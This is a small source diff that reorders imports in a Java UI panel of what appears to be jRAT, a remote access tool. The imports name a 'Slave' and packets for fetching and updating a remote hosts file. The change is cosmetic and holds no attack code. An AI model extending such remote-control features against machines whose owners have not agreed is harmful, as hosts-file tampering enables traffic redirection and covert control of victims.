@@ -1,19 +1,18 @@
 package io.jrat.controller.ui.panels;
 
+import com.redpois0n.oslib.OperatingSystem;
 import iconlib.IconUtils;
 import io.jrat.controller.ErrorDialog;
 import io.jrat.controller.Slave;
 import io.jrat.controller.packets.outgoing.Packet55HostsFile;
 import io.jrat.controller.packets.outgoing.Packet56UpdateHostsFile;
 import io.jrat.controller.utils.Utils;
-
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.InputStreamReader;
-
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
 import javax.swing.JButton;
@@ -22,8 +21,6 @@ import javax.swing.JSeparator;
 import javax.swing.JTextPane;
 import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.SwingConstants;
-
-import com.redpois0n.oslib.OperatingSystem;
 
 
 @SuppressWarnings("serial")
